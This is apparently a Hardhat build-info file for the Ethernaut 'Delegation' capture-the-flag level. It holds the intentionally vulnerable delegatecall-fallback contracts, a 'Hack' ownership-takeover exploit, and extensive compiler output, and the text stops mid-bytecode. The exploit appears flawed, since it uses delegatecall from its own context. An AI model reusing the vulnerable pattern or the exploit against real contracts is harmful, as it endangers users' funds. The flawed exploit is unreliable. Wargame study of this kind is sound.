{
	"id": "c970db2f35f3af730fb98ef95daab508",
	"_format": "hh-sol-build-info-1",
	"solcVersion": "0.8.17",
	"solcLongVersion": "0.8.17+commit.8df45f5f",
	"input": {
		"language": "Solidity",
		"sources": {
			"contracts/Ethernaut/06-Delegate.sol": {
				"content": "// SPDX-License-Identifier: MIT\r\npragma solidity ^0.8.0;\r\n\r\ncontract Delegate {\r\n\r\n  address public owner;\r\n\r\n  constructor(address _owner) {\r\n    owner = _owner;\r\n  }\r\n\r\n  function pwn() public {\r\n    owner = msg.sender;\r\n  }\r\n}\r\n\r\ncontract Delegation {\r\n\r\n  address public owner;\r\n  Delegate delegate;\r\n\r\n  constructor(address _delegateAddress) {\r\n    delegate = Delegate(_delegateAddress);\r\n    owner = msg.sender;\r\n  }\r\n\r\n  fallback() external {\r\n    (bool result,) = address(delegate).delegatecall(msg.data);\r\n    if (result) {\r\n      this;\r\n    }\r\n  }\r\n}\r\n\r\ncontract Hack {\r\n    event Response(bool success, bytes data);\r\n\r\n    // set the address below to the instance address of your Ethernaut level\r\n    // this address points to your Delegation contract, not the Delegate contract\r\n\r\n    Delegation delegationContract = Delegation(0xf8e81D47203A594245E36C48e151709F0C19fBe8);\r\n\r\n    function exploit() public {\r\n\r\n      // we then try to call the pwn() function\r\n      // since the function does not exist, it falls back to the fallback method\r\n      (bool success, bytes memory data) = address(delegationContract).delegatecall(abi.encodeWithSignature(\"pwn()\"));\r\n    \r\n      emit Response(success, data);\r\n    }\r\n}"
			}
		},
		"settings": {
			"optimizer": {
				"enabled": false,
				"runs": 200
			},
			"outputSelection": {
				"*": {
					"": [
						"ast"
					],
					"*": [
						"abi",
						"metadata",
						"devdoc",
						"userdoc",
						"storageLayout",
						"evm.legacyAssembly",
						"evm.bytecode",
						"evm.deployedBytecode",
						"evm.methodIdentifiers",
						"evm.gasEstimates",
						"evm.assembly"
					]
				}
			}
		}
	},
	"output": {
		"contracts": {
			"contracts/Ethernaut/06-Delegate.sol": {
				"Delegate": {
					"abi": [
						{
							"inputs": [
								{
									"internalType": "address",
									"name": "_owner",
									"type": "address"
								}
							],
							"stateMutability": "nonpayable",
							"type": "constructor"
						},
						{
							"inputs": [],
							"name": "owner",
							"outputs": [
								{
									"internalType": "address",
									"name": "",
									"type": "address"
								}
							],
							"stateMutability": "view",
							"type": "function"
						},
						{
							"inputs": [],
							"name": "pwn",
							"outputs": [],
							"stateMutability": "nonpayable",
							"type": "function"
						}
					],
					"devdoc": {
						"kind": "dev",
						"methods": {},
						"version": 1
					},
					"evm": {
						"assembly": "    /* \"contracts/Ethernaut/06-Delegate.sol\":60:229  contract Delegate {... */\n  mstore(0x40, 0x80)\n    /* \"contracts/Ethernaut/06-Delegate.sol\":112:167  constructor(address _owner) {... */\n  callvalue\n  dup1\n  iszero\n  tag_1\n  jumpi\n  0x00\n  dup1\n  revert\ntag_1:\n  pop\n  mload(0x40)\n  sub(codesize, bytecodeSize)\n  dup1\n  bytecodeSize\n  dup4\n  codecopy\n  dup2\n  dup2\n  add\n  0x40\n  mstore\n  dup2\n  add\n  swap1\n  tag_2\n  swap2\n  swap1\n  tag_3\n  jump\t// in\ntag_2:\n    /* \"contracts/Ethernaut/06-Delegate.sol\":155:161  _owner */\n  dup1\n    /* \"contracts/Ethernaut/06-Delegate.sol\":147:152  owner */\n  0x00\n  dup1\n    /* \"contracts/Ethernaut/06-Delegate.sol\":147:161  owner = _owner */\n  0x0100\n  exp\n  dup2\n  sload\n  dup2\n  0xffffffffffffffffffffffffffffffffffffffff\n  mul\n  not\n  and\n  swap1\n  dup4\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n  mul\n  or\n  swap1\n  sstore\n  pop\n    /* \"contracts/Ethernaut/06-Delegate.sol\":112:167  constructor(address _owner) {... */\n  pop\n    /* \"contracts/Ethernaut/06-Delegate.sol\":60:229  contract Delegate {... */\n  jump(tag_6)\n    /* \"#utility.yul\":88:205   */\ntag_8:\n    /* \"#utility.yul\":197:198   */\n  0x00\n    /* \"#utility.yul\":194:195   */\n  dup1\n    /* \"#utility.yul\":187:199   */\n  revert\n    /* \"#utility.yul\":334:460   */\ntag_10:\n    /* \"#utility.yul\":371:378   */\n  0x00\n    /* \"#utility.yul\":411:453   */\n  0xffffffffffffffffffffffffffffffffffffffff\n    /* \"#utility.yul\":404:409   */\n  dup3\n    /* \"#utility.yul\":400:454   */\n  and\n    /* \"#utility.yul\":389:454   */\n  swap1\n  pop\n    /* \"#utility.yul\":334:460   */\n  swap2\n  swap1\n  pop\n  jump\t// out\n    /* \"#utility.yul\":466:562   */\ntag_11:\n    /* \"#utility.yul\":503:510   */\n  0x00\n    /* \"#utility.yul\":532:556   */\n  tag_20\n    /* \"#utility.yul\":550:555   */\n  dup3\n    /* \"#utility.yul\":532:556   */\n  tag_10\n  jump\t// in\ntag_20:\n    /* \"#utility.yul\":521:556   */\n  swap1\n  pop\n    /* \"#utility.yul\":466:562   */\n  swap2\n  swap1\n  pop\n  jump\t// out\n    /* \"#utility.yul\":568:690   */\ntag_12:\n    /* \"#utility.yul\":641:665   */\n  tag_22\n    /* \"#utility.yul\":659:664   */\n  dup2\n    /* \"#utility.yul\":641:665   */\n  tag_11\n  jump\t// in\ntag_22:\n    /* \"#utility.yul\":634:639   */\n  dup2\n    /* \"#utility.yul\":631:666   */\n  eq\n    /* \"#utility.yul\":621:684   */\n  tag_23\n  jumpi\n    /* \"#utility.yul\":680:681   */\n  0x00\n    /* \"#utility.yul\":677:678   */\n  dup1\n    /* \"#utility.yul\":670:682   */\n  revert\n    /* \"#utility.yul\":621:684   */\ntag_23:\n    /* \"#utility.yul\":568:690   */\n  pop\n  jump\t// out\n    /* \"#utility.yul\":696:839   */\ntag_13:\n    /* \"#utility.yul\":753:758   */\n  0x00\n    /* \"#utility.yul\":784:790   */\n  dup2\n    /* \"#utility.yul\":778:791   */\n  mload\n    /* \"#utility.yul\":769:791   */\n  swap1\n  pop\n    /* \"#utility.yul\":800:833   */\n  tag_25\n    /* \"#utility.yul\":827:832   */\n  dup2\n    /* \"#utility.yul\":800:833   */\n  tag_12\n  jump\t// in\ntag_25:\n    /* \"#utility.yul\":696:839   */\n  swap3\n  swap2\n  pop\n  pop\n  jump\t// out\n    /* \"#utility.yul\":845:1196   */\ntag_3:\n    /* \"#utility.yul\":915:921   */\n  0x00\n    /* \"#utility.yul\":964:966   */\n  0x20\n    /* \"#utility.yul\":952:961   */\n  dup3\n    /* \"#utility.yul\":943:950   */\n  dup5\n    /* \"#utility.yul\":939:962   */\n  sub\n    /* \"#utility.yul\":935:967   */\n  slt\n    /* \"#utility.yul\":932:1051   */\n  iszero\n  tag_27\n  jumpi\n    /* \"#utility.yul\":970:1049   */\n  tag_28\n  tag_8\n  jump\t// in\ntag_28:\n    /* \"#utility.yul\":932:1051   */\ntag_27:\n    /* \"#utility.yul\":1090:1091   */\n  0x00\n    /* \"#utility.yul\":1115:1179   */\n  tag_29\n    /* \"#utility.yul\":1171:1178   */\n  dup5\n    /* \"#utility.yul\":1162:1168   */\n  dup3\n    /* \"#utility.yul\":1151:1160   */\n  dup6\n    /* \"#utility.yul\":1147:1169   */\n  add\n    /* \"#utility.yul\":1115:1179   */\n  tag_13\n  jump\t// in\ntag_29:\n    /* \"#utility.yul\":1105:1179   */\n  swap2\n  pop\n    /* \"#utility.yul\":1061:1189   */\n  pop\n    /* \"#utility.yul\":845:1196   */\n  swap3\n  swap2\n  pop\n  pop\n  jump\t// out\n    /* \"contracts/Ethernaut/06-Delegate.sol\":60:229  contract Delegate {... */\ntag_6:\n  dataSize(sub_0)\n  dup1\n  dataOffset(sub_0)\n  0x00\n  codecopy\n  0x00\n  return\nstop\n\nsub_0: assembly {\n        /* \"contracts/Ethernaut/06-Delegate.sol\":60:229  contract Delegate {... */\n      mstore(0x40, 0x80)\n      callvalue\n      dup1\n      iszero\n      tag_1\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_1:\n      pop\n      jumpi(tag_2, lt(calldatasize, 0x04))\n      shr(0xe0, calldataload(0x00))\n      dup1\n      0x8da5cb5b\n      eq\n      tag_3\n      jumpi\n      dup1\n      0xdd365b8b\n      eq\n      tag_4\n      jumpi\n    tag_2:\n      0x00\n      dup1\n      revert\n        /* \"contracts/Ethernaut/06-Delegate.sol\":85:105  address public owner */\n    tag_3:\n      tag_5\n      tag_6\n      jump\t// in\n    tag_5:\n      mload(0x40)\n      tag_7\n      swap2\n      swap1\n      tag_8\n      jump\t// in\n    tag_7:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"contracts/Ethernaut/06-Delegate.sol\":173:226  function pwn() public {... */\n    tag_4:\n      tag_9\n      tag_10\n      jump\t// in\n    tag_9:\n      stop\n        /* \"contracts/Ethernaut/06-Delegate.sol\":85:105  address public owner */\n    tag_6:\n      0x00\n      dup1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      jump\t// out\n        /* \"contracts/Ethernaut/06-Delegate.sol\":173:226  function pwn() public {... */\n    tag_10:\n        /* \"contracts/Ethernaut/06-Delegate.sol\":210:220  msg.sender */\n      caller\n        /* \"contracts/Ethernaut/06-Delegate.sol\":202:207  owner */\n      0x00\n      dup1\n        /* \"contracts/Ethernaut/06-Delegate.sol\":202:220  owner = msg.sender */\n      0x0100\n      exp\n      dup2\n      sload\n      dup2\n      0xffffffffffffffffffffffffffffffffffffffff\n      mul\n      not\n      and\n      swap1\n      dup4\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      mul\n      or\n      swap1\n      sstore\n      pop\n        /* \"contracts/Ethernaut/06-Delegate.sol\":173:226  function pwn() public {... */\n      jump\t// out\n        /* \"#utility.yul\":7:133   */\n    tag_12:\n        /* \"#utility.yul\":44:51   */\n      0x00\n        /* \"#utility.yul\":84:126   */\n      0xffffffffffffffffffffffffffffffffffffffff\n        /* \"#utility.yul\":77:82   */\n      dup3\n        /* \"#utility.yul\":73:127   */\n      and\n        /* \"#utility.yul\":62:127   */\n      swap1\n      pop\n        /* \"#utility.yul\":7:133   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":139:235   */\n    tag_13:\n        /* \"#utility.yul\":176:183   */\n      0x00\n        /* \"#utility.yul\":205:229   */\n      tag_18\n        /* \"#utility.yul\":223:228   */\n      dup3\n        /* \"#utility.yul\":205:229   */\n      tag_12\n      jump\t// in\n    tag_18:\n        /* \"#utility.yul\":194:229   */\n      swap1\n      pop\n        /* \"#utility.yul\":139:235   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":241:359   */\n    tag_14:\n        /* \"#utility.yul\":328:352   */\n      tag_20\n        /* \"#utility.yul\":346:351   */\n      dup2\n        /* \"#utility.yul\":328:352   */\n      tag_13\n      jump\t// in\n    tag_20:\n        /* \"#utility.yul\":323:326   */\n      dup3\n        /* \"#utility.yul\":316:353   */\n      mstore\n        /* \"#utility.yul\":241:359   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":365:587   */\n    tag_8:\n        /* \"#utility.yul\":458:462   */\n      0x00\n        /* \"#utility.yul\":496:498   */\n      0x20\n        /* \"#utility.yul\":485:494   */\n      dup3\n        /* \"#utility.yul\":481:499   */\n      add\n        /* \"#utility.yul\":473:499   */\n      swap1\n      pop\n        /* \"#utility.yul\":509:580   */\n      tag_22\n        /* \"#utility.yul\":577:578   */\n      0x00\n        /* \"#utility.yul\":566:575   */\n      dup4\n        /* \"#utility.yul\":562:579   */\n      add\n        /* \"#utility.yul\":553:559   */\n      dup5\n        /* \"#utility.yul\":509:580   */\n      tag_14\n      jump\t// in\n    tag_22:\n        /* \"#utility.yul\":365:587   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n\n    auxdata: 0xa2646970667358221220e69e9bbb39c236b64633331cbda11c5868a4c70a7a30c6846bcaf62d337bad8f64736f6c63430008110033\n}\n",
						"bytecode": {
							"functionDebugData": {
								"@_13": {
									"entryPoint": null,
									"id": 13,
									"parameterSlots": 1,
									"returnSlots": 0
								},
								"abi_decode_t_address_fromMemory": {
									"entryPoint": 198,
									"id": null,
									"parameterSlots": 2,
									"returnSlots": 1
								},
								"abi_decode_tuple_t_address_fromMemory": {
									"entryPoint": 219,
									"id": null,
									"parameterSlots": 2,
									"returnSlots": 1
								},
								"allocate_unbounded": {
									"entryPoint": null,
									"id": null,
									"parameterSlots": 0,
									"returnSlots": 1
								},
								"cleanup_t_address": {
									"entryPoint": 157,
									"id": null,
									"parameterSlots": 1,
									"returnSlots": 1
								},
								"cleanup_t_uint160": {
									"entryPoint": 125,
									"id": null,
									"parameterSlots": 1,
									"returnSlots": 1
								},
								"revert_error_c1322bf8034eace5e0b5c7295db60986aa89aae5e0ea0873e4689e076861a5db": {
									"entryPoint": null,
									"id": null,
									"parameterSlots": 0,
									"returnSlots": 0
								},
								"revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b": {
									"entryPoint": 120,
									"id": null,
									"parameterSlots": 0,
									"returnSlots": 0
								},
								"validator_revert_t_address": {
									"entryPoint": 175,
									"id": null,
									"parameterSlots": 1,
									"returnSlots": 0
								}
							},
							"generatedSources": [
								{
									"ast": {
										"nodeType": "YulBlock",
										"src": "0:1199:1",
										"statements": [
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "47:35:1",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "57:19:1",
															"value": {
																"arguments": [
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "73:2:1",
																		"type": "",
																		"value": "64"
																	}
																],
																"functionName": {
																	"name": "mload",
																	"nodeType": "YulIdentifier",
																	"src": "67:5:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "67:9:1"
															},
															"variableNames": [
																{
																	"name": "memPtr",
																	"nodeType": "YulIdentifier",
																	"src": "57:6:1"
																}
															]
														}
													]
												},
												"name": "allocate_unbounded",
												"nodeType": "YulFunctionDefinition",
												"returnVariables": [
													{
														"name": "memPtr",
														"nodeType": "YulTypedName",
														"src": "40:6:1",
														"type": ""
													}
												],
												"src": "7:75:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "177:28:1",
													"statements": [
														{
															"expression": {
																"arguments": [
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "194:1:1",
																		"type": "",
																		"value": "0"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "197:1:1",
																		"type": "",
																		"value": "0"
																	}
																],
																"functionName": {
																	"name": "revert",
																	"nodeType": "YulIdentifier",
																	"src": "187:6:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "187:12:1"
															},
															"nodeType": "YulExpressionStatement",
															"src": "187:12:1"
														}
													]
												},
												"name": "revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b",
												"nodeType": "YulFunctionDefinition",
												"src": "88:117:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "300:28:1",
													"statements": [
														{
															"expression": {
																"arguments": [
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "317:1:1",
																		"type": "",
																		"value": "0"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "320:1:1",
																		"type": "",
																		"value": "0"
																	}
																],
																"functionName": {
																	"name": "revert",
																	"nodeType": "YulIdentifier",
																	"src": "310:6:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "310:12:1"
															},
															"nodeType": "YulExpressionStatement",
															"src": "310:12:1"
														}
													]
												},
												"name": "revert_error_c1322bf8034eace5e0b5c7295db60986aa89aae5e0ea0873e4689e076861a5db",
												"nodeType": "YulFunctionDefinition",
												"src": "211:117:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "379:81:1",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "389:65:1",
															"value": {
																"arguments": [
																	{
																		"name": "value",
																		"nodeType": "YulIdentifier",
																		"src": "404:5:1"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "411:42:1",
																		"type": "",
																		"value": "0xffffffffffffffffffffffffffffffffffffffff"
																	}
																],
																"functionName": {
																	"name": "and",
																	"nodeType": "YulIdentifier",
																	"src": "400:3:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "400:54:1"
															},
															"variableNames": [
																{
																	"name": "cleaned",
																	"nodeType": "YulIdentifier",
																	"src": "389:7:1"
																}
															]
														}
													]
												},
												"name": "cleanup_t_uint160",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nodeType": "YulTypedName",
														"src": "361:5:1",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "cleaned",
														"nodeType": "YulTypedName",
														"src": "371:7:1",
														"type": ""
													}
												],
												"src": "334:126:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "511:51:1",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "521:35:1",
															"value": {
																"arguments": [
																	{
																		"name": "value",
																		"nodeType": "YulIdentifier",
																		"src": "550:5:1"
																	}
																],
																"functionName": {
																	"name": "cleanup_t_uint160",
																	"nodeType": "YulIdentifier",
																	"src": "532:17:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "532:24:1"
															},
															"variableNames": [
																{
																	"name": "cleaned",
																	"nodeType": "YulIdentifier",
																	"src": "521:7:1"
																}
															]
														}
													]
												},
												"name": "cleanup_t_address",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nodeType": "YulTypedName",
														"src": "493:5:1",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "cleaned",
														"nodeType": "YulTypedName",
														"src": "503:7:1",
														"type": ""
													}
												],
												"src": "466:96:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "611:79:1",
													"statements": [
														{
															"body": {
																"nodeType": "YulBlock",
																"src": "668:16:1",
																"statements": [
																	{
																		"expression": {
																			"arguments": [
																				{
																					"kind": "number",
																					"nodeType": "YulLiteral",
																					"src": "677:1:1",
																					"type": "",
																					"value": "0"
																				},
																				{
																					"kind": "number",
																					"nodeType": "YulLiteral",
																					"src": "680:1:1",
																					"type": "",
																					"value": "0"
																				}
																			],
																			"functionName": {
																				"name": "revert",
																				"nodeType": "YulIdentifier",
																				"src": "670:6:1"
																			},
																			"nodeType": "YulFunctionCall",
																			"src": "670:12:1"
																		},
																		"nodeType": "YulExpressionStatement",
																		"src": "670:12:1"
																	}
																]
															},
															"condition": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"name": "value",
																				"nodeType": "YulIdentifier",
																				"src": "634:5:1"
																			},
																			{
																				"arguments": [
																					{
																						"name": "value",
																						"nodeType": "YulIdentifier",
																						"src": "659:5:1"
																					}
																				],
																				"functionName": {
																					"name": "cleanup_t_address",
																					"nodeType": "YulIdentifier",
																					"src": "641:17:1"
																				},
																				"nodeType": "YulFunctionCall",
																				"src": "641:24:1"
																			}
																		],
																		"functionName": {
																			"name": "eq",
																			"nodeType": "YulIdentifier",
																			"src": "631:2:1"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "631:35:1"
																	}
																],
																"functionName": {
																	"name": "iszero",
																	"nodeType": "YulIdentifier",
																	"src": "624:6:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "624:43:1"
															},
															"nodeType": "YulIf",
															"src": "621:63:1"
														}
													]
												},
												"name": "validator_revert_t_address",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nodeType": "YulTypedName",
														"src": "604:5:1",
														"type": ""
													}
												],
												"src": "568:122:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "759:80:1",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "769:22:1",
															"value": {
																"arguments": [
																	{
																		"name": "offset",
																		"nodeType": "YulIdentifier",
																		"src": "784:6:1"
																	}
																],
																"functionName": {
																	"name": "mload",
																	"nodeType": "YulIdentifier",
																	"src": "778:5:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "778:13:1"
															},
															"variableNames": [
																{
																	"name": "value",
																	"nodeType": "YulIdentifier",
																	"src": "769:5:1"
																}
															]
														},
														{
															"expression": {
																"arguments": [
																	{
																		"name": "value",
																		"nodeType": "YulIdentifier",
																		"src": "827:5:1"
																	}
																],
																"functionName": {
																	"name": "validator_revert_t_address",
																	"nodeType": "YulIdentifier",
																	"src": "800:26:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "800:33:1"
															},
															"nodeType": "YulExpressionStatement",
															"src": "800:33:1"
														}
													]
												},
												"name": "abi_decode_t_address_fromMemory",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "offset",
														"nodeType": "YulTypedName",
														"src": "737:6:1",
														"type": ""
													},
													{
														"name": "end",
														"nodeType": "YulTypedName",
														"src": "745:3:1",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "value",
														"nodeType": "YulTypedName",
														"src": "753:5:1",
														"type": ""
													}
												],
												"src": "696:143:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "922:274:1",
													"statements": [
														{
															"body": {
																"nodeType": "YulBlock",
																"src": "968:83:1",
																"statements": [
																	{
																		"expression": {
																			"arguments": [],
																			"functionName": {
																				"name": "revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b",
																				"nodeType": "YulIdentifier",
																				"src": "970:77:1"
																			},
																			"nodeType": "YulFunctionCall",
																			"src": "970:79:1"
																		},
																		"nodeType": "YulExpressionStatement",
																		"src": "970:79:1"
																	}
																]
															},
															"condition": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"name": "dataEnd",
																				"nodeType": "YulIdentifier",
																				"src": "943:7:1"
																			},
																			{
																				"name": "headStart",
																				"nodeType": "YulIdentifier",
																				"src": "952:9:1"
																			}
																		],
																		"functionName": {
																			"name": "sub",
																			"nodeType": "YulIdentifier",
																			"src": "939:3:1"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "939:23:1"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "964:2:1",
																		"type": "",
																		"value": "32"
																	}
																],
																"functionName": {
																	"name": "slt",
																	"nodeType": "YulIdentifier",
																	"src": "935:3:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "935:32:1"
															},
															"nodeType": "YulIf",
															"src": "932:119:1"
														},
														{
															"nodeType": "YulBlock",
															"src": "1061:128:1",
															"statements": [
																{
																	"nodeType": "YulVariableDeclaration",
																	"src": "1076:15:1",
																	"value": {
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "1090:1:1",
																		"type": "",
																		"value": "0"
																	},
																	"variables": [
																		{
																			"name": "offset",
																			"nodeType": "YulTypedName",
																			"src": "1080:6:1",
																			"type": ""
																		}
																	]
																},
																{
																	"nodeType": "YulAssignment",
																	"src": "1105:74:1",
																	"value": {
																		"arguments": [
																			{
																				"arguments": [
																					{
																						"name": "headStart",
																						"nodeType": "YulIdentifier",
																						"src": "1151:9:1"
																					},
																					{
																						"name": "offset",
																						"nodeType": "YulIdentifier",
																						"src": "1162:6:1"
																					}
																				],
																				"functionName": {
																					"name": "add",
																					"nodeType": "YulIdentifier",
																					"src": "1147:3:1"
																				},
																				"nodeType": "YulFunctionCall",
																				"src": "1147:22:1"
																			},
																			{
																				"name": "dataEnd",
																				"nodeType": "YulIdentifier",
																				"src": "1171:7:1"
																			}
																		],
																		"functionName": {
																			"name": "abi_decode_t_address_fromMemory",
																			"nodeType": "YulIdentifier",
																			"src": "1115:31:1"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "1115:64:1"
																	},
																	"variableNames": [
																		{
																			"name": "value0",
																			"nodeType": "YulIdentifier",
																			"src": "1105:6:1"
																		}
																	]
																}
															]
														}
													]
												},
												"name": "abi_decode_tuple_t_address_fromMemory",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "headStart",
														"nodeType": "YulTypedName",
														"src": "892:9:1",
														"type": ""
													},
													{
														"name": "dataEnd",
														"nodeType": "YulTypedName",
														"src": "903:7:1",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "value0",
														"nodeType": "YulTypedName",
														"src": "915:6:1",
														"type": ""
													}
												],
												"src": "845:351:1"
											}
										]
									},
									"contents": "{\n\n    function allocate_unbounded() -> memPtr {\n        memPtr := mload(64)\n    }\n\n    function revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b() {\n        revert(0, 0)\n    }\n\n    function revert_error_c1322bf8034eace5e0b5c7295db60986aa89aae5e0ea0873e4689e076861a5db() {\n        revert(0, 0)\n    }\n\n    function cleanup_t_uint160(value) -> cleaned {\n        cleaned := and(value, 0xffffffffffffffffffffffffffffffffffffffff)\n    }\n\n    function cleanup_t_address(value) -> cleaned {\n        cleaned := cleanup_t_uint160(value)\n    }\n\n    function validator_revert_t_address(value) {\n        if iszero(eq(value, cleanup_t_address(value))) { revert(0, 0) }\n    }\n\n    function abi_decode_t_address_fromMemory(offset, end) -> value {\n        value := mload(offset)\n        validator_revert_t_address(value)\n    }\n\n    function abi_decode_tuple_t_address_fromMemory(headStart, dataEnd) -> value0 {\n        if slt(sub(dataEnd, headStart), 32) { revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b() }\n\n        {\n\n            let offset := 0\n\n            value0 := abi_decode_t_address_fromMemory(add(headStart, offset), dataEnd)\n        }\n\n    }\n\n}\n",
									"id": 1,
									"language": "Yul",
									"name": "#utility.yul"
								}
							],
							"linkReferences": {},
							"object": "608060405234801561001057600080fd5b50604051610272380380610272833981810160405281019061003291906100db565b806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555050610108565b600080fd5b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b60006100a88261007d565b9050919050565b6100b88161009d565b81146100c357600080fd5b50565b6000815190506100d5816100af565b92915050565b6000602082840312156100f1576100f0610078565b5b60006100ff848285016100c6565b91505092915050565b61015b806101176000396000f3fe608060405234801561001057600080fd5b50600436106100365760003560e01c80638da5cb5b1461003b578063dd365b8b14610059575b600080fd5b610043610063565b604051610050919061010a565b60405180910390f35b610061610087565b005b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b336000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b60006100f4826100c9565b9050919050565b610104816100e9565b82525050565b600060208201905061011f60008301846100fb565b9291505056fea2646970667358221220e69e9bbb39c236b64633331cbda11c5868a4c70a7a30c6846bcaf62d337bad8f64736f6c63430008110033",
							"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x40 MLOAD PUSH2 0x272 CODESIZE SUB DUP1 PUSH2 0x272 DUP4 CODECOPY DUP2 DUP2 ADD PUSH1 0x40 MSTORE DUP2 ADD SWAP1 PUSH2 0x32 SWAP2 SWAP1 PUSH2 0xDB JUMP JUMPDEST DUP1 PUSH1 0x0 DUP1 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP POP PUSH2 0x108 JUMP JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0xA8 DUP3 PUSH2 0x7D JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0xB8 DUP2 PUSH2 0x9D JUMP JUMPDEST DUP2 EQ PUSH2 0xC3 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP JUMP JUMPDEST PUSH1 0x0 DUP2 MLOAD SWAP1 POP PUSH2 0xD5 DUP2 PUSH2 0xAF JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0xF1 JUMPI PUSH2 0xF0 PUSH2 0x78 JUMP JUMPDEST JUMPDEST PUSH1 0x0 PUSH2 0xFF DUP5 DUP3 DUP6 ADD PUSH2 0xC6 JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH2 0x15B DUP1 PUSH2 0x117 PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH2 0x36 JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x8DA5CB5B EQ PUSH2 0x3B JUMPI DUP1 PUSH4 0xDD365B8B EQ PUSH2 0x59 JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0x43 PUSH2 0x63 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 